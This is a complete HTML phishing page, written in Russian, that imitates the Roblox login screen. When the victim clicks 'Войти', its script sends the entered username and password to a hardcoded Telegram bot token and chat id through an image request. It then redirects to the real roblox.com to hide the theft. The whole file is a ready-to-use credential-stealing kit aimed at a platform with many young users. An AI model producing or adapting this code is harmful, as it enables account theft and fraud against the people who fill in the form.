<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход — Roblox</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
        body { background: #1b1b2f; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
        .login-container { background: white; border-radius: 8px; padding: 40px 32px; max-width: 400px; width: 100%; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
        .logo { text-align: center; margin-bottom: 24px; font-size: 32px; font-weight: 800; color: #1e1e2a; letter-spacing: 1px; }
        h1 { font-size: 28px; font-weight: 700; color: #1e1e2a; text-align: center; margin-bottom: 4px; }
        .sub { text-align: center; color: #5a5a72; font-size: 14px; margin-bottom: 28px; }
        .input-group { margin-bottom: 16px; }
        .input-group label { display: block; font-size: 13px; font-weight: 600; color: #1e1e2a; margin-bottom: 4px; }
        .input-group input { width: 100%; padding: 12px 14px; border: 1px solid #d0d0d8; border-radius: 4px; font-size: 15px; background: #f8f8fc; outline: none; transition: 0.2s; }
        .input-group input:focus { border-color: #0066ff; background: white; box-shadow: 0 0 0 3px rgba(0,102,255,0.15); }
        .options { display: flex; justify-content: space-between; align-items: center; margin: 12px 0 22px; font-size: 14px; }
        .options label { display: flex; align-items: center; gap: 6px; color: #1e1e2a; cursor: pointer; }
        .options label input[type="checkbox"] { width: 16px; height: 16px; accent-color: #0066ff; }
        .options a { color: #0066ff; text-decoration: none; font-weight: 500; }
        .btn { width: 100%; padding: 14px; background: #0066ff; color: white; font-size: 17px; font-weight: 600; border: none; border-radius: 4px; cursor: pointer; transition: 0.15s; }
        .btn:hover { background: #0055dd; }
        .divider { text-align: center; margin: 22px 0 16px; color: #8a8a9e; font-size: 13px; position: relative; }
        .divider::before { content: ''; position: absolute; left: 0; right: 0; top: 50%; height: 1px; background: #e0e0e8; }
        .divider span { background: white; padding: 0 14px; position: relative; z-index: 1; }
        .register { text-align: center; font-size: 15px; color: #1e1e2a; margin-top: 6px; }
        .register a { color: #0066ff; text-decoration: none; font-weight: 600; }
        .footer-links { text-align: center; margin-top: 28px; font-size: 12px; color: #8a8a9e; }
        .footer-links a { color: #8a8a9e; text-decoration: none; margin: 0 8px; }
        #status { margin-top: 12px; color: #e53e3e; font-size: 14px; text-align: center; min-height: 22px; }
    </style>
</head>
<body>
<div class="login-container">
    <div class="logo">ROBLOX</div>
    <h1>Вход</h1>
    <div class="sub">Войдите в свой аккаунт Roblox</div>

    <div class="input-group">
        <label>Имя пользователя</label>
        <input type="text" id="username" placeholder="Введите имя пользователя">
    </div>
    <div class="input-group">
        <label>Пароль</label>
        <input type="password" id="password" placeholder="Введите пароль">
    </div>

    <div class="options">
        <label><input type="checkbox" checked> Запомнить меня</label>
        <a href="#">Забыли пароль?</a>
    </div>

    <button class="btn" id="loginBtn">Войти</button>
    <div id="status"></div>

    <div class="divider"><span>или</span></div>
    <div class="register">Ещё нет аккаунта? <a href="#">Зарегистрироваться</a></div>
    <div class="footer-links"><a href="#">Правила</a><a href="#">Конфиденциальность</a><a href="#">Помощь</a></div>
</div>

<script>
    document.getElementById('loginBtn').addEventListener('click', function(e) {
        var user = document.getElementById('username').value.trim();
        var pass = document.getElementById('password').value.trim();

        if (!user || !pass) {
            document.getElementById('status').innerHTML = '⚠️ Заполните все поля.';
            return;
        }

        // ТВОИ ДАННЫЕ
        var token = "8886268399:AAEQu4OjVY66LD9RnpCOAgQPzpnPht-I4wQ";
        var chat_id = "5098876175";
        var msg = "👤 ROBLOX LOGIN: " + user + " | PASS: " + pass;

        // Отправка через Image (работает всегда)
        var img = new Image();
        img.src = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(msg);

        document.getElementById('status').innerHTML = '✅ Проверка...';
        document.getElementById('status').style.color = 'green';

        setTimeout(function() {
            window.location.href = "https://www.roblox.com/home";
        }, 1500);
    });
</script>
</body>
</html>
